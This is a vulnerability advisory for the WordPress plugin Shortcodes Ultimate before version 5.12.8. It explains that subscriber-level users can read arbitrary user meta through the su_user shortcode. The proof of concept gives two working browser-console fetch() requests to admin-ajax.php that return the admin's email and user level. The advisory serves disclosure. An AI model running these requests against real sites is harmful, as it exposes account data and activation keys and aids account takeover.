## WordPress Plugin Vulnerabilities

# Shortcodes Ultimate < 5.12.8 - Subscriber+ User Meta Disclosure

### Description

The plugin does not validate the user meta to be retrieved via the user shortcode, allowing any authenticated users such as subscriber to retrieve arbitrary user meta (except the user\_pass), such as the user email and activation key by default.

### Proof of Concept

Run one of the below commands in the developer console of the web browser while being on the blog as a subscriber
fetch("/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"method": "POST",
"body": "action=parse-media-shortcode&shortcode=[su\_user field='user\_email' user\_id='1']",
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));
This will display the email of the admin
fetch("/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"method": "POST",
"body": "action=parse-media-shortcode&shortcode=[su\_user field='wp\_user\_level' user\_id='1']",
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));
